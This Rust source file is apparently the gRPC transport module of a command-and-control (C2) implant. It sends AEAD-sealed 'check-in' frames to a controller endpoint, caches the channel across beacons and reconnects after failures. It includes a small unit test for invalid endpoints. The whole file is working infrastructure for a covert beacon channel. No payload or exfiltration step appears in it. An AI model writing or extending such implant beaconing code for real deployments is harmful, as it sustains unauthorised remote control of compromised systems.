//! gRPC client carrier for the C2 check-in.
//!
//! Mirrors the server: the protocol is still one sealed (AEAD) envelope, and
//! `proto/c2.proto` carries it as an opaque `bytes sealed` field. So this
//! module only builds a tonic channel, sends the blob, and returns the reply
//! — all crypto and routing stays in the shared protocol code.

use tonic::transport::{Channel, Endpoint};

/// Generated from `proto/c2.proto`.
pub mod pb {
    #![allow(clippy::all)]
    tonic::include_proto!("nw");
}

use pb::Frame;
use pb::c2_client::C2Client;

/// The cached client type, so callers never name tonic generics.
pub type SharedClient = C2Client<Channel>;

/// Send one sealed frame and return the sealed reply.
///
/// The channel is cached by the caller and reused across beacons. Any failure
/// drops the cached channel so a broken connection (or a server restart) does
/// not poison every later beacon.
pub async fn exchange(
    endpoint: &str,
    cache: &tokio::sync::Mutex<Option<SharedClient>>,
    sealed: &[u8],
) -> Result<Vec<u8>, String> {
    let mut guard = cache.lock().await;
    if guard.is_none() {
        // No client-side handshake or keepalive tuning: the frame is already
        // AEAD-protected, so this only needs to be a working HTTP/2 pipe.
        let channel = Endpoint::from_shared(endpoint.to_owned())
            .map_err(|e| format!("invalid grpc endpoint {endpoint:?}: {e}"))?
            .connect()
            .await
            .map_err(|e| format!("grpc connect to {endpoint} failed: {e}"))?;
        *guard = Some(C2Client::new(channel));
    }

    let client = guard.as_mut().expect("channel established above");
    let reply = client
        .checkin(Frame {
            sealed: sealed.to_vec(),
        })
        .await;

    match reply {
        Ok(frame) => Ok(frame.into_inner().sealed),
        Err(status) => {
            // Drop the channel: a transport error is often a dead connection,
            // and reusing it would fail every subsequent beacon.
            *guard = None;
            Err(format!("grpc checkin failed: {status}"))
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn bad_endpoint_fails_without_panicking() {
        let cache = tokio::sync::Mutex::new(None);
        let err = exchange("not a uri", &cache, b"x")
            .await
            .expect_err("invalid endpoint must fail");
        assert!(err.contains("invalid grpc endpoint"), "{err}");
    }
}
